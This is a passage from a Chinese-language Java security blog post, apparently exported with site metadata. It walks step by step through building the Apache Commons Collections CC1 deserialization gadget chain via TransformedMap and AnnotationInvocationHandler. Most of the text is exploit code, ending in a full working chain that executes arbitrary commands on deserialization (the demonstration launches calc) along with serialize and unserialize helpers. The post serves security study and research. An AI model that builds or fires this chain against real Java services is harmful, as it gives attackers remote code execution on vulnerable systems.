args;&#125; 也就是说这个反射代码的所有参数都可以进行控制，只要能传入指定参数就能够实现任意代码执行。构造如下代码，运行成功弹出计算器 123456public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; 调用点1：TransformedMap查找关于transform方法的调用，在TransformedMap这个类中找到一处可利用的调用点checkSetValue方法 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 如果能够将valueTransformer设置为InvokerTransformer，参数传递为Runtime.getRuntime,那么就能够执行到我们的代码。 查找valueTransformer的赋值，是来自于构造函数 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 这里的构造函数接收三个参数，一个Map和两个Transformer。但是这个构造函数是被protected修饰，表示只能被当前类或父子类进行调用，查找这个构造方法的调用点，找到一个decorate方法 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 接收参数，然后返回一个TransformedMap类的实例 构造一个TransformedMap实例，构造一个Map集合传入，keyTransformer参数不需要，传入null即可。valueTransformer的位置传入构造的invokerTransformer 12345678910public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hmap, null, invokerTransformer); &#125;&#125; 此时调用获取的decorate对象的checkSetValue方法并传入参数，但是这个方法也是protected修饰，也是只能被当前类或父子类进行调用，继续查找调用。 调用点2：AbstractInputCheckedMapDecorator查找checkSetValue调用只有一处，位于AbstractInputCheckedMapDecorator类的setValue方法中，这个类是TransformedMap类的父类，这个方法位于MapEntry这个内部静态类中 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 那么这里我们应该如何赋值并调用呢？直接问AI 这个类是一个装饰器，对原本Map.Entry进行包装修饰增强，其实就是遍历Map集合，一个Entry就是Map集合中的一个键值对，按照提示构造代码，能够弹出计算器 1234567891011121314public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); for(Object object : decorate.entrySet()) &#123; Map.Entry entry = (Map.Entry) object; // 这里 setValue 会触发 invokerTransformer 的 transform 方法 entry.setValue(Runtime.getRuntime()); &#125; &#125;&#125; 这里为什么遍历就能过执行到内部类中的setValue方法？简单来说，TransformedMap继承了AbstractInputCheckedMapDecorator类，这个类重写了entrySet方法，最后返回的就是AbstractInputCheckedMapDecorator的MapEntry 我们继续查找AbstractInputCheckedMapDecorator类中内部类MapEntry的setValue方法的调用 反序列化入口：AnnotationInvocationHandler查找setValue调用时，在AnnotationInvocationHandler类中找到了调用点，位于readObject方法中，能够直接作为反序列化起点使用，并且正好在进行处于遍历的过程中 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 在这里只要控制memberValue为Invokertransformer，给setValue传入参数Runtime.getRuntime，就能进行命令执行 这里的memberValue是对memberValues遍历获取的键值对，来自于memberValues，也就说控制memberValues为构造的TransformedMap集合，就能够执行到漏洞代码。而memberValues是通过构造函数进行赋值的，所以这里先新建这个对象。 但是这个类没有修饰符，即默认为default修饰，这表示只允许当前包中调用 所以这里选择反射进行调用赋值。查看构造函数中的参数，第一个是一个继承了注解类的Class类，即需要一个注解的Class。第二个参数是一个Map集合，这里就传入我们构造的TransformedMap 12345678910111213141516171819public class CC1TransformedMap &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for(Object object : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) object; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 这里对这个对象o进行序列化和反序列化是否能够实现命令执行呢？答案是不能，这里还存在三个问题： Runtime类没有实现序列化接口，所以传入的Runtime.getRuntime无法进入序列化流程 setValue的参数不能控制为我们想要传入的参数 readObject方法中还存在两个if判断，需要绕过 解决问题1：反射解决Runtime无法序列化既然无法直接序列化Runtime，那么就通过反射进行赋值操作，这里直接采用InvokerTransformer类进行赋值反射操作 123456789101112131415161718192021public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.Class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 可以看到这里执行了很多相同的新建InvokerTransformer并执行了transform方法，可以通过ChainsTransformer类进行优化，这个类构造函数接收一个Transformer数组，然后它的transform方法接收一个参数，数组中第一个transformer通过transform方法接收这个参数，并将执行结果作为参数传入第二个transformer中 构造代码，此时如果我们调用chainedTransformer.transform(Runtime.class)就成功执行代码，就说明这里的构造没有问题。 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 解决问题2：setValue参数无法控制这里调用setValue方法其实就是在调用transform方法，其中的参数最后会传递到transform方法中。 但是这里参数无法控制，应该怎么传入我们想要的值呢？ 这里就要引入一个ConstantTransformer类，这个类的transform方法接收任意参数都只会返回iConstant，然而iConstant是构造方法中进行赋值的，也就是说只要实例化这个类时传入构造函数的参数为Runtime.class，无论transform接收到什么参数，都只会返回Runtime.class 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate);&#125; 假如当执行到setValue时，传入的参数是1，就相当于chainedTransformer的transform方法接收到了一个1，然后传递给Transformer数组中的第一个Transformer的transform方法，即ConstantTransformer的transform，最后返回了Runtime.class。再将这个结果传递给第二个Transformer的transform方法作为参数，成功绕过了setValue无法控制的问题。 解决问题3：绕过if判断第一个判断第一个判断是if (memberType != null) &#123; 判断memberType 是否为空 memerType的构造大概如下： 123456Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); ......&#125; annotationType.memberTypes();中annotationType来自于构造方法接收的注解类，这里大概就是获取传入注解类的成员属性和类型，返回为一个Map集合 String name = memberValue.getKey();：其中memberValue是遍历memberValues是的每一个键值对，这个memberValues也是来自于构造方法接收的参数，也就是我们构造的hMap集合，然后遍历时获取其中键值对的键名。 Class&lt;?&gt; memberType = memberTypes.get(name);：这里就是获取注解类中为hMap键名的值 那么第一个判断其实就是在判断hMap的键名是否是传入的注解类中的一个成员属性名，如果是就进入判断。所以这里就要满足两个条件： 传入的注解类存在成员属性 hMap集合的key要设置为这个注解类的成员属性名 我们这里传入的注解类是Target，查看这个类，正好存在一个成员属性value 所以接下来需要将hMap的键名设置为value即可 1234567891011121314151617181920212223242526272829public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 第二个判断第二个判断是：if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))，简单来说这里就是在判断hMap的value是否是某个实例，如果不是就进入判断。 我们这里传入的是一个随机字符串，不用处理就能够直接进入这一层的if 最终利用链根据上面的思路构造的利用链如下，此时执行反序列化就能够实现任意命令，这里是弹出计算器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); //serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 流程图","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}